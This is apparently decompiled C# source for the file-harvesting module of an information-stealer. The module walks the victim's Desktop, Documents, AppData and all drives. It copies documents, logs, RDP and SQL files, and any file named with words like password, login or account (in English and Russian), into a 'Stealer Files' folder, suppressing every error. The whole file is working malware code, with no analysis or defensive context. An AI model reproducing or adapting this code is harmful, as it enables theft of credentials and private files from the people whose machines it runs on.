using System;
using System.IO;

internal class DFiles
{
	protected static string path = $"{Buffer.path_l}Stealer Files";

	protected static void SearchFiles(string dir, string _path)
	{
		bool flag = false;
		string[] array = new string[7]
		{
			".txt",
			".rtf",
			".log",
			".doc",
			".docx",
			".rdp",
			".sql"
		};
		FileInfo[] files = new DirectoryInfo(dir).GetFiles();
		if (files.Length == 0)
		{
			return;
		}
		FileInfo[] array2 = files;
		foreach (FileInfo fileInfo in array2)
		{
			string text = fileInfo.Extension.ToLower();
			string text2 = fileInfo.Name.ToLower().Substring(0, fileInfo.Name.Length - text.Length);
			if (text2.Contains("password") || text2.Contains("login") || text2.Contains("account") || text2.Contains("аккаунт") || text2.Contains("парол") || text2.Contains("вход") || text2.Contains("важно") || text2.Contains("сайта") || text2.Contains("site"))
			{
				try
				{
					if (fileInfo.Length <= 50000)
					{
						if (!flag && !Directory.Exists(_path))
						{
							Directory.CreateDirectory(_path);
							flag = true;
						}
						fileInfo.CopyTo(_path + "\\" + fileInfo.Name);
					}
				}
				catch
				{
				}
				continue;
			}
			string[] array3 = array;
			foreach (string a in array3)
			{
				try
				{
					if (!(a != text))
					{
						if (!flag && !Directory.Exists(_path))
						{
							Directory.CreateDirectory(_path);
							flag = true;
						}
						fileInfo.CopyTo(_path + "\\" + fileInfo.Name);
						goto IL_01bd;
					}
				}
				catch
				{
				}
			}
			IL_01bd:;
		}
	}

	public static void Start()
	{
		try
		{
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			string dir = null;
			string[] array = null;
			string dir2 = null;
			string[] array2 = null;
			string dir3 = null;
			string[] array3 = null;
			string dir4 = null;
			string[] array4 = null;
			try
			{
				dir = Buffer.path_dp;
			}
			catch
			{
			}
			try
			{
				dir2 = Buffer.path_ds;
			}
			catch
			{
			}
			try
			{
				dir3 = Buffer.path_ad;
			}
			catch
			{
			}
			try
			{
				dir4 = Buffer.path_lad;
			}
			catch
			{
			}
			try
			{
				SearchFiles(dir, path + "\\Desktop Files");
				array = Directory.GetDirectories(dir);
			}
			catch
			{
			}
			try
			{
				SearchFiles(dir2, path + "\\Documents Files");
				array2 = Directory.GetDirectories(dir2);
			}
			catch
			{
			}
			try
			{
				SearchFiles(dir3, path + "\\AppData Files");
				array3 = Directory.GetDirectories(dir3);
			}
			catch
			{
			}
			try
			{
				SearchFiles(dir4, path + "\\LocalAppData Files");
				array4 = Directory.GetDirectories(dir4);
			}
			catch
			{
			}
			string[] array5;
			if (array.Length != 0)
			{
				array5 = array;
				for (int i = 0; i < array5.Length; i++)
				{
					SearchFiles(array5[i], path + "\\Disks Files");
				}
			}
			if (array2.Length != 0)
			{
				array5 = array2;
				for (int i = 0; i < array5.Length; i++)
				{
					SearchFiles(array5[i], path + "\\Disks Files");
				}
			}
			if (array3.Length != 0)
			{
				array5 = array3;
				for (int i = 0; i < array5.Length; i++)
				{
					SearchFiles(array5[i], path + "\\Disks Files");
				}
			}
			if (array4.Length != 0)
			{
				array5 = array4;
				for (int i = 0; i < array5.Length; i++)
				{
					SearchFiles(array5[i], path + "\\Disks Files");
				}
			}
			array5 = Environment.GetLogicalDrives();
			foreach (string dir5 in array5)
			{
				try
				{
					SearchFiles(dir5, path + "\\Disks Files");
				}
				catch
				{
				}
				try
				{
					string[] directories = Directory.GetDirectories(dir5);
					if (directories.Length != 0)
					{
						string[] array6 = directories;
						foreach (string dir6 in array6)
						{
							try
							{
								string a = Path.GetDirectoryName(dir6).ToLower();
								if (!(a == "windows") && !(a == "programdata") && !(a == "program files (x86)") && !(a == "program files") && !(a == "пользователи") && !(a == "users") && !(a == "perflogs"))
								{
									SearchFiles(dir6, path + "\\Disks Files");
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
			}
			if (Directory.GetDirectories(path).Length == 0)
			{
				File.WriteAllText(path + "\\info.txt", "===================================== [LOGS] =====================================" + Environment.NewLine + Environment.NewLine + "Файлы которые могли нести ценность не были найдены.");
			}
		}
		catch
		{
		}
	}
}
